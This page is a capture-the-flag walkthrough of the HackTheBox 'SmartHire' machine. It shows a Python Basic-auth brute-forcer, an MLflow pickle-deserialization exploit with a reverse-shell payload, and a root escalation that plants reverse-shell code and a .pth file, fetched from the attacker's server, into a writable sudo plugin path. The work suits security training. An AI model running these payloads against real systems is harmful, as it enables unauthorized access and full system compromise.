---
layout: page
title: SmartHire
description: Pickle Deserialization Abuse and Sudo Script Manip.
img: 
importance: 3
category: HackTheBox
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/smarthire/logo.png" title="HTB SmartHire Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/SmartHire">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Time to see how smart we are by taking on the SmartHire box.

The first step is to add `smarthire.htb` to the `/etc/hosts` file.

{% capture etchosts %}
┌──(kali㉿kali)-[~/Documents/htb/smarthire]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.245.215   smarthire.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=etchosts %}

<br />
Next up, give nmap a run to identify those services.

{% capture nmap %}
┌──(kali㉿kali)-[~/Documents/htb/smarthire]
└─$ sudo nmap -sC -sV -A -O -oN nmap smarthire.htb
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-30 14:12 +1000
Nmap scan report for smarthire.htb (10.129.245.215)
Host is up (0.59s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 41:3c:e3:bb:88:70:99:7f:b8:96:59:48:9b:85:98:69 (ECDSA)
|_  256 d5:9d:fd:6b:be:d8:39:6f:3f:43:ab:0e:f6:3e:22:db (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Overview | SmartHIRE
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   585.49 ms 10.10.16.1
2   292.79 ms smarthire.htb (10.129.245.215)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.32 seconds
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=nmap %}

<br />
Run curl with the `-I` option to pull the headers to try and identify the technology.

{% capture curli %}
┌──(kali㉿kali)-[~/Documents/htb/smarthire]
└─$ curl -I http://smarthire.htb         
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 29 Aug 2026 04:19:18 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 11255
Connection: keep-alive
Vary: Cookie
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=curli %}

<br />
Check the landing page running on port 80.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/smarthire/landing.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Read the landing page source code looking for anything juicy.

{% capture sourcecode %}
<!doctype html>
<html lang="en" class="h-full scroll-smooth">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Overview | SmartHIRE</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <script src="/static/js/tailwind.js"></script>
    <script>
      tailwind.config = {
        theme: {
          extend: {
            colors: {
              brand: '#134CA6'
            },
            fontFamily: { sans: ['Inter', 'ui-sans-serif', 'system-ui'] }
          }
        },
        darkMode: 'class'
      }
    </script>
  </head>
  <body class="min-h-screen bg-gray-950 text-gray-100 font-sans flex flex-col">
    <header class="sticky top-0 z-50 border-b border-gray-800 bg-gray-900/80 backdrop-blur">
      <div class="max-w-6xl mx-auto px-4">
        <div class="flex items-center justify-between h-20">
          <a href="/" class="inline-flex items-baseline gap-0">
            <span class="text-3xl font-semibold text-brand">Smart</span><span class="text-3xl font-extrabold text-brand">HIRE</span>
          </a>
          <nav class="flex items-center gap-2">
            <a href="/#about" class="px-3 py-2 rounded-md hover:bg-gray-800">About</a>
            <a href="/#products" class="px-3 py-2 rounded-md hover:bg-gray-800">Products</a>
            <a href="/#testimonials" class="px-3 py-2 rounded-md hover:bg-gray-800">Testimonials</a>
            


            
              
                <a href="/login" class="px-3 py-2 rounded-md bg-brand text-white hover:bg-blue-700">Sign in</a>
                          
            
          </nav>
        </div>
      </div>
    </header>

    <main class="flex-1 max-w-6xl mx-auto px-4 py-14">
{% endcapture %}
{% include terminal.html language='browser' title='view-source:http://smarthire.htb' content=sourcecode %}

<br />
Run FFUF to try and identify any subdomains.

{% capture ffufsubdomain %}
┌──(kali㉿kali)-[~/Documents/htb/smarthire]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://smarthire.htb -H "Host: FUZZ.smarthire.htb" -fw 6

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://smarthire.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.smarthire.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 6
________________________________________________

models                  [Status: 401, Size: 137, Words: 11, Lines: 1, Duration: 304ms]
:: Progress: [114442/114442] :: Job [1/1] :: 134 req/sec :: Duration: [0:14:41] :: Errors: 0 ::
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=ffufsubdomain %}

<br />
Register a user at the `/register` endpoint.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/smarthire/register.png" title="Register User" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Authenticate with the new user that was just registered.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/smarthire/dashboard.png" title="Dashboard" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Add the models subdomain to the `/etc/hosts` file.

{% capture modelsetchosts %}
┌──(kali㉿kali)-[~/Documents/htb/smarthire]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.245.215   smarthire.htb models.smarthire.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=modelsetchosts %}

<br />
Check the new models subdomain to see what it is.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/smarthire/models.png" title="Models Subdomain" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Create a test.csv so we can test the model training functionality.

{% capture testcsv %}
experience,skills
60,"Python, Machine Learning, SQL"
{% endcapture %}
{% include codebox.html title="test.csv" content=testcsv %}

<br />
Train the model with the fake data that we just made.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/smarthire/faketrain.png" title="Train Model" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Analyze the fake resume on the fake data.  Should be 100% since it is exactly the same as the fake data.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/smarthire/analyze.png" title="Analyze Resume" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Cancel the authentication and notice the reference to MLFlow.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/smarthire/mlflow.png" title="Notice MLFlow" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Look up the MLFlow documentation and note the default credentials.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/smarthire/mldocs.png" title="Default Credentials" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Write a brute-forcer to crack the admin password.

{% capture bruter %}
import requests
import base64

user = 'admin'
url = 'http://models.smarthire.htb/'
headers = {
    'Host':'models.smarthire.htb',
    'Authorization':'Basic YWRtaW46cGFzd29yZDEyMzQ=',
    'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36'
}

with open('/usr/share/wordlists/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt') as f:
    for line in f:
        passwd = line.rstrip("\n")
        b64_string = f'admin:{passwd}'
        pass_encoded_string = base64.b64encode(b64_string.encode("utf-8")).decode('utf-8')
        auth_string = f'Basic {pass_encoded_string}'

        headers['Authorization'] = auth_string

        r = requests.get(url=url, headers=headers)
        if 'not authenticated' not in r.text:
            print(f'[*] {passwd}')
            break
{% endcapture %}
{% include terminal.html language='python' title='brute_0x00.py' content=bruter %}

<br />
Run the bruter and discover the `password` password.

{% capture crackpassword %}
┌──(kali㉿kali)-[~/Documents/htb/smarthire]
└─$ python3 brute_0x00.py
[*] password
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=crackpassword %}

<br />
Authenticate into the models subdomain with the default username and the cracked password.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/smarthire/modelsdashboard.png" title="Models Dashboard" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Google mlflow 2.14.1 looking for an appropriate exploit.  Reviewing the exploit notice that it is a pickle deserialization attack.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/smarthire/mlflowexploit.png" title="MLFlow Exploit" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://github.com/Spydomain/CVE-2024-37054-MLflow-reverse-shell">https://github.com/Spydomain/CVE-2024-37054-MLflow-reverse-shell</a>

<br />
Clone the exploit repo.

{% capture clonerepo %}
┌──(kali㉿kali)-[~/Documents/htb/smarthire]
└─$ git clone https://github.com/Spydomain/CVE-2024-37054-MLflow-reverse-shell.git
Cloning into 'CVE-2024-37054-MLflow-reverse-shell'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 12 (delta 4), reused 5 (delta 1), pack-reused 0 (from 0)
Receiving objects: 100% (12/12), 4.59 KiB | 4.59 MiB/s, done.
Resolving deltas: 100% (4/4), done.
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=clonerepo %}

<br />
Update the script that generates the malicious pickle with the tun0 LHOST IP address.

{% capture generatepickle %}
┌──(kali㉿kali)-[~/Documents/htb/smarthire/CVE-2024-37054-MLflow-reverse-shell]
└─$ cat generate_model.py                 
import pickle, os

LHOST = "10.10.16.32"  # your tun0 IP
LPORT = 4444

class Exploit(object):
    def __reduce__(self):
        cmd = f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'"
        return (os.system, (cmd,))

with open("model.pkl", "wb") as f:
    pickle.dump(Exploit(), f)
print("[+] model.pkl created")
{% endcapture %}
{% include terminal.html language='python' title='generate_model.py' content=generatepickle %}

<br />
Generate a tainted model that creates a reverse shell in the reduce function.

{% capture rungneratemodel %}
┌──(kali㉿kali)-[~/Documents/htb/smarthire/CVE-2024-37054-MLflow-reverse-shell]
└─$ python3 generate_model.py 
[+] model.pkl created
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=rungneratemodel %}

<br />
Start a netcat listener.

{% capture netcatlistener %}
┌──(kali㉿kali)-[~/Documents/htb/smarthire]
└─$ nc -nlvp 4444                             
listening on [any] 4444 ...
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=netcatlistener %}

<br />
Update the script that uploads the model with this box's information.

{% capture uploadmodel %}
import requests
import time

USERNAME = "admin"
PASSWORD = "password"
MLFLOW = "http://models.smarthire.htb" # Change the url to models url
MODEL_NAME = "fakecompany-74c01db68e0f-model" #Change active model name from main domain shown after uploading csv file

session = requests.Session()
session.auth = (USERNAME, PASSWORD)

<snip>

{% endcapture %}
{% include terminal.html language='python' title='upload_model.py' content=uploadmodel %}

<br />
Run the upload script to upload the model.

{% capture runuploadmodel %}
┌──(kali㉿kali)-[~/Documents/htb/smarthire/CVE-2024-37054-MLflow-reverse-shell]
└─$ python3 upload_model.py  
[DEBUG] Experiment: 200 - {
  "experiment_id": "844189411550903991"
}
[+] Experiment ID: 844189411550903991
[+] Run ID: 85131788a0b7473cadba67640ba2d4ec
[+] Pickle upload: 200
[+] MLmodel upload: 200
[DEBUG] Register: 400 - {"error_code": "RESOURCE_ALREADY_EXISTS", "message": "Registered Model (name=fakecompany-74c01db68e0f-model) already exists."}
[DEBUG] Version: 200 - {
  "model_version": {
    "name": "fakecompany-74c01db68e0f-model",
    "version": "2",
    "creation_timestamp": 1787984242134,
    "last_updated_timestamp": 1787984242134,
    "current_stage": "None",
    "description": "",
    "source": "runs:/85131788a0b7473cadba67640ba2d4ec/model",
    "run_id": "85131788a0b7473cadba67640ba2d4ec",
    "status": "READY",
    "run_link": ""
  }
}
[+] New version: 2
[+] Stage transition: 200
[+] Done! Waiting for shell on trigger...
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=runuploadmodel %}

<br />
Curl the `/predict` endpoint to trigger the model deserialization and call the reduce payload.

{% capture curlpredict %}
┌──(kali㉿kali)-[~/Documents/htb/smarthire/CVE-2024-37054-MLflow-reverse-shell]
└─$ curl -X POST http://smarthire.htb/predict \ 
  -H "Cookie: session=.eJyrVkrOzy1IzKtUslJKS8xOhfF0lEqLU4viM1OA4uYmyQaGKUlmFqkGaVCJvMTcVKgOMLMWAHdsF_0.apJf4A.EPY63PFV2er9oFx90mxrO0oeSN4" \
  -F "file=@sample.csv"
<html>
<head><title>502 Bad Gateway</title></head>
<body>
<center><h1>502 Bad Gateway</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=curlpredict %}

<br />
Check the listener and catch the shell.

{% capture catchshell %}
┌──(kali㉿kali)-[~/Documents/htb/smarthire]
└─$ nc -nlvp 4444                             
listening on [any] 4444 ...
connect to [10.10.16.32] from (UNKNOWN) [10.129.245.215] 50030
id
uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)
python3 -c 'import pty; pty.spawn("/bin/bash");'
svcweb@smarthire:/var/www/smarthire.htb$
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=catchshell %}

<br />
Get the user.txt flag.

{% capture userflag %}
svcweb@smarthire:~$ cat user.txt
cat user.txt
<redacted>
svcweb@smarthire:~$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:95:51:7c brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.129.245.215/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 3208sec preferred_lft 3208sec
    inet6 dead:beef::250:56ff:fe95:517c/64 scope global dynamic mngtmpaddr 
       valid_lft 86395sec preferred_lft 14395sec
    inet6 fe80::250:56ff:fe95:517c/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 96:38:b6:1a:8d:a8 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::9438:b6ff:fe1a:8da8/64 scope link 
       valid_lft forever preferred_lft forever
4: vethe90100e@if2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 22:3b:df:77:a1:d3 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::203b:dfff:fe77:a1d3/64 scope link 
       valid_lft forever preferred_lft forever
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=userflag %}

<br />
Run `sudo -l` to get a list of all command that the user can run as sudo user.

{% capture sudol %}
svcweb@smarthire:~$ sudo -l
sudo -l
Matching Defaults entries for svcweb on smarthire:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=sudol %}

<br />
Read the mlflowctl.py file that is referenced in the `sudo -l` output.

{% capture mlflowctl %}
svcweb@smarthire:~$ cat /opt/tools/mlflow_ctl/mlflowctl.py
cat /opt/tools/mlflow_ctl/mlflowctl.py
#!/usr/bin/env python3
"""
MLFLOW-CTL: Operational interface for managing the MLflow service.
Supports a pluggable extension model for environment-specific logic.
For changes or plugin requests, please contact the Platform Team.
"""

from pathlib import Path
import sys
import site

BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

# make plugins importable
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))

def print_usage():
    print("Usage: mlflowctl.py [status|backup-models|restart]")
    sys.exit(1)

def main():
    import mlflow_actions, backup_models

    if len(sys.argv) < 2:
        print_usage()

    action = sys.argv[1]

    if action == "status":
        mlflow_actions.check_status()
    elif action == "backup-models":
        print("[*] Running backup via backup_models plugin...")
        backup_models.run()
    elif action == "restart":
        mlflow_actions.restart()
    else:
        print(f"[!] Unknown action: {action}")
        print_usage()
{% endcapture %}
{% include terminal.html language='python' title='/opt/tools/mlflow_ctl/mlflowctl.py' content=mlflowctl %}

<br />
Check the `/plugins/` folder that was referenced in the script.

{% capture plugins %}
svcweb@smarthire:~$ ls -la /opt/tools/mlflow_ctl/plugins/
ls -la /opt/tools/mlflow_ctl/plugins/
total 16
drwxr-xr-x 4 root root 4096 Feb 19  2026 .
drwxr-xr-x 3 root root 4096 Feb 19  2026 ..
drwxr-xr-x 3 root root 4096 Feb 20  2026 core
drwxrwxr-x 2 root devs 4096 May 12 15:22 dev
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=plugins %}

<br />
Create a reverse shell python script.

{% capture backupscript %}
import socket
import subprocess
import os
import pty

def run():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.16.32",443));os.dup2(s.fileno(),0) 
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    pty.spawn("/bin/bash")
{% endcapture %}
{% include terminal.html language='python' title='backup_models.py' content=backupscript %}

<br />
Set-up a web server to serve that python script.

{% capture pythonserver %}
┌──(kali㉿kali)-[~/Documents/htb/smarthire]
└─$ python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=pythonserver %}

<br />
Transfer the backup_models.py script into the back dev plugins folder.

{% capture transferexploit %}
svcweb@smarthire:/opt/tools/mlflow_ctl/plugins/dev$ wget 10.10.16.32/backup_models.py
<_ctl/plugins/dev$ wget 10.10.16.32/backup_models.py
--2026-08-29 07:18:02--  http://10.10.16.32/backup_models.py
Connecting to 10.10.16.32:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 256 [text/x-python]
Saving to: ‘backup_models.py’

backup_models.py    100%[===================>]     256  --.-KB/s    in 0s      

2026-08-29 07:18:04 (22.9 MB/s) - ‘backup_models.py’ saved [256/256]
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=transferexploit %}

<br />
Look up the documentation for add path, addsitedir, and .pth.  The first python script failed because the script already found in the backup_models.py in the core folder and wouldn't process any more.  Some kind of script parameter pollution isn't possible.  But the addsitedir() will process a .pth file before the main even runs when it sees the import.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/smarthire/pythondocs.png" title="Python Docs" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Create a second reverse shell.

{% capture createsec %}
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.32",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=createsec %}

<br />
Transfer it to the victim machine.

{% capture servesec %}
┌──(kali㉿kali)-[~/Documents/htb/smarthire]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.245.215 - - [30/Aug/2026 17:39:35] "GET /sec.pth HTTP/1.1" 200 -
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=servesec %}

{% capture transfersec %}
svcweb@smarthire:/opt/tools/mlflow_ctl/plugins/dev$ wget 10.10.16.32/sec.pth
wget 10.10.16.32/sec.pth
--2026-08-29 07:43:22--  http://10.10.16.32/sec.pth
Connecting to 10.10.16.32:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 225 [application/octet-stream]
Saving to: ‘sec.pth’

sec.pth             100%[===================>]     225  --.-KB/s    in 0s      

2026-08-29 07:43:23 (21.1 MB/s) - ‘sec.pth’ saved [225/225]
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=transfersec %}

<br />
Run the `sudo -l` script.

{% capture runsudol %}
svcweb@smarthire:/var/www/smarthire.htb$ sudo -l
sudo -l
Matching Defaults entries for svcweb on smarthire:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
svcweb@smarthire:/var/www/smarthire.htb$ sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py backup-models
<10 /opt/tools/mlflow_ctl/mlflowctl.py backup-models
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=runsudol %}

<br />
Check the listener and catch the shell.

{% capture catchrootshell %}
┌──(kali㉿kali)-[~/Documents/htb/smarthire]
└─$ sudo nc -nlvp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.16.32] from (UNKNOWN) [10.129.245.215] 50912
root@smarthire:/var/www/smarthire.htb#
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=catchrootshell %}

<br />
Get the root.txt flag.

{% capture rootflag %}
root@smarthire:/var/www/smarthire.htb# cat /root/root.txt
cat /root/root.txt
<redacted>
root@smarthire:/var/www/smarthire.htb# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:95:51:7c brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.129.245.215/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 3050sec preferred_lft 3050sec
    inet6 dead:beef::250:56ff:fe95:517c/64 scope global dynamic mngtmpaddr 
       valid_lft 86397sec preferred_lft 14397sec
    inet6 fe80::250:56ff:fe95:517c/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 96:38:b6:1a:8d:a8 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::9438:b6ff:fe1a:8da8/64 scope link 
       valid_lft forever preferred_lft forever
4: vethe90100e@if2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 22:3b:df:77:a1:d3 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::203b:dfff:fe77:a1d3/64 scope link 
       valid_lft forever preferred_lft forever
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=rootflag %}

<br/>
<h2>Trophy</h2>

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/smarthire/trophy.png" title="Trophy" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
